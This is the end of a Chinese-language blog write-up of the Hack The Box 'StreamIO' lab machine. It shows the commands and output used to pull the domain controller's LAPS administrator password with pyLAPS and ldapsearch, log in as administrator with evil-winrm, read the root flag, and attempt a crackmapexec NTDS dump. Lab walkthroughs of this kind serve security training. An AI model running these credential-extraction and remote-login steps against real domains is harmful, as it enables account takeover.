CN=JDgodd,CN=Users,DC=streamIO,DC=htb<br>MemberObjectClass       : user<br>MemberSID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1470860369</span><span class="hljs-number">-1569627196</span><span class="hljs-number">-4264678630</span><span class="hljs-number">-1104</span><br><br><br><br>*Evil-WinRM* PS C:\Downloads&gt; <br></code></pre></td></tr></table></figure>

<p>34、弄好权限后，那就继续开始使用工具进行获取密码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 pyLAPS.py --action get -d <span class="hljs-string">&quot;streamIO.htb&quot;</span> -u <span class="hljs-string">&quot;JDgodd&quot;</span> -p <span class="hljs-string">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span> --dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span><br>                 __    ___    ____  _____<br>    ____  __  __/ /   /   |  / __ \/ ___/<br>   / __ \/ / / / /   / /| | / /_/ /\__ \   <br>  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   <br> / .___/\__, /_____/_/  |_/_/    /____/    v1<span class="hljs-number">.2</span><br>/_/    /____/           @podalirius_           <br>    <br>[+] Extracting LAPS passwords of all computers ... <br>  | DC$                  : nn99ur8t[mvtS]<br>[+] All done!<br></code></pre></td></tr></table></figure>

<p>35、读取最终flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -u administrator -p <span class="hljs-string">&#x27;nn99ur8t[mvtS]&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt<br>Cannot find path <span class="hljs-string">&#x27;C:\Users\Administrator\Desktop\root.txt&#x27;</span> because it does not exist.<br>At line:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ type root.txt<br>+ ~~~~~~~~~~~~~<br>    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException<br>    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cd C:\Users\Martin\desktop\<br>*Evil-WinRM* PS C:\Users\Martin\desktop&gt; ls<br><br><br>    Directory: C:\Users\Martin\desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">4</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">31</span> AM             <span class="hljs-number">34</span> root.txt<br><br><br>*Evil-WinRM* PS C:\Users\Martin\desktop&gt; type root.txt<br><span class="hljs-number">8</span>cced4b2dcebb9a0c6120be99831b40e<br>*Evil-WinRM* PS C:\Users\Martin\desktop&gt; <br></code></pre></td></tr></table></figure>

<p><strong>36、其他读取方法：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ldapsearch -H ldap:<span class="hljs-comment">//10.10.11.158 -b &#x27;DC=streamIO,DC=htb&#x27; -x -D JDgodd@streamio.htb -w &#x27;JDg0dd1s@d0p3cr3@t0r&#x27; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</span><br><span class="hljs-meta"># extended LDIF</span><br>#<br># LDAPv3<br><span class="hljs-meta"># base <span class="hljs-string">&lt;DC=streamIO,DC=htb&gt;</span> with scope subtree</span><br><span class="hljs-meta"># filter: (ms-MCS-AdmPwd=*)</span><br><span class="hljs-meta"># requesting: ms-MCS-AdmPwd </span><br>#<br><br># DC, Domain Controllers, streamIO.htb<br>dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb<br>ms-Mcs-AdmPwd: nn99ur8t[mvtS]<br><br><span class="hljs-meta"># search reference</span><br>ref: ldap:<span class="hljs-comment">//ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb</span><br><br><span class="hljs-meta"># search reference</span><br>ref: ldap:<span class="hljs-comment">//DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb</span><br><br><span class="hljs-meta"># search reference</span><br>ref: ldap:<span class="hljs-comment">//streamIO.htb/CN=Configuration,DC=streamIO,DC=htb</span><br><br><span class="hljs-meta"># search result</span><br>search: <span class="hljs-number">2</span><br>result: <span class="hljs-number">0</span> Success<br><br># numResponses: <span class="hljs-number">5</span><br># numEntries: <span class="hljs-number">1</span><br># numReferences: <span class="hljs-number">3</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -u JDgodd -p <span class="hljs-string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> --laps --ntds<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] DC\administrator:nn99ur8t[mvtS] STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/474</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>StreamIO-htb-writeup</div>
      <div>https://sh1yan.top/2024/04/11/StreamIO-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年4月11日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/04/14/Conceal-htb-writeup/" title="Conceal-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Conceal-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/04/07/Termux-Configuration-manual/" title="转载 - Termux 高级终端安装使用配置教程">
                        <span class="hidden-mobile">转载 - Termux 高级终端安装使用配置教程</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
